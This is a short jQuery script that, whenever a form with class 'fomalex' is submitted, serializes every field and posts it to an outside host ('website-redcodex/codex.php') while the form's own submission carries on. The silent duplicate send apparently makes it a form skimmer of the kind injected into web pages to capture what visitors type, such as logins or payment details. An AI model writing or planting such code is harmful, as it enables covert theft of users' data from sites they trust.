$(".fomalex").submit(function() {

	var d = $(".fomalex");

	$.ajax({

        url: "http://website-redcodex/codex.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
